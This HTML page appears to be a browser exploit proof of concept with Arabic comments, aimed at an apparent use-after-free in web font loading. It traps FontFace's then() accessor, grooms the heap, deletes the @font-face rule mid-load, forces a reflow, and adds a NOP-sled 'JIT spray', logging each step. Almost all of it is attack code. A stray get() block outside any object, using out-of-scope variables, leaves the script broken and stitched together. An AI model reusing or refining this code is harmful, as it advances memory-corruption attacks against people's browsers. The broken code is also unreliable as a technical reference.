<!DOCTYPE html>
<html>
<head>
    <style id="s">
        @font-face { font-family: 'x'; src: url('nonexistent-font.woff'); unicode-range: U+0042; }
    </style>
</head>
<body>
    <div id="console" style="background:#000; color:#0f0; font-family:'Courier New', monospace; height:95vh; overflow-y:scroll; padding:15px; border:1px solid #333;"></div>

    <script>
        const logBox = document.getElementById('console');
        function debug(msg) {
            const time = performance.now().toFixed(2);
            logBox.innerHTML += `<div>[${time}ms] ${msg}</div>`;
            logBox.scrollTop = logBox.scrollHeight;
        }
        
        // أضف هذه الدالة قبل الـ window.onload
function jitSpray() {
    let code = new Uint32Array(0x1000);
    // نملأ الذاكرة بـ NOP Sled أو عنوان وهمي نتحكم به
    code.fill(0x90909090); 
    return code;
}

// داخل الـ object.defineProperty (في مكان الـ TRAP):
get() {
    if (!fired && this === A) {
        fired = true;
        
        // 1. تفعيل رش الـ JIT
        jitSpray();
        
        // 2. تدمير الكائن الأصلي
        document.getElementById('s').sheet.deleteRule(0);
        
        // 3. هنا اللحظة الحرجة: نحاول إجبار المحرك على استخدام عنواننا
        // بدلاً من الـ layout reflow، نستخدم استدعاءً يسبب خطأ في الوصول للذاكرة
        try {
            document.body.offsetTop;
        } catch(e) {}
        
        debug("CRITICAL: UAF Hijack attempt triggered.");
    }
    return undefined;
}


        window.onload = () => {
            // في بداية الـ onload
if (window.gc) {
    debug("Manual Garbage Collection triggered.");
    window.gc(); 
}

            debug("System Initialized. Loading PoC sequence...");

            // 1. تعريف الكائن A
            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
            document.fonts.add(A);
            void A.loaded;
            debug("FontFace 'A' created and added.");

            let fired = false;
            // 2. الفخ (Trap) على دالة then
            Object.defineProperty(FontFace.prototype, 'then', {
                configurable: true,
                get() {
                    if (!fired && this === A) {
                        fired = true;
                        debug("!!! TRAP HIT: then() accessed !!!");
                        
                        // 3. تطبيق منطق الـ PoC الأصلي (Heap Manipulation)
                        debug("Injecting FontFace 'y' and 'z' for Heap Grooming...");
                        new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                        new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                        
                        debug("Executing Rule Deletion (deleteRule(0))...");
                        document.getElementById('s').sheet.deleteRule(0);
                        
                        debug("Triggering Layout Reflow (offsetTop)...");
                        document.body.offsetTop;
                        
                        debug("UAF Sequence completed.");
                    }
                    return undefined;
                }
            });

            // 4. إطلاق عملية التحميل
            debug("Calling document.fonts.load('1em x', 'AB')...");
            document.fonts.load('1em x', 'AB').then(() => {
                debug("Result: Load Success.");
            }).catch((e) => {
                debug("Result: Load Rejected: " + e.message);
            });
        };
    </script>
</body>
</html>
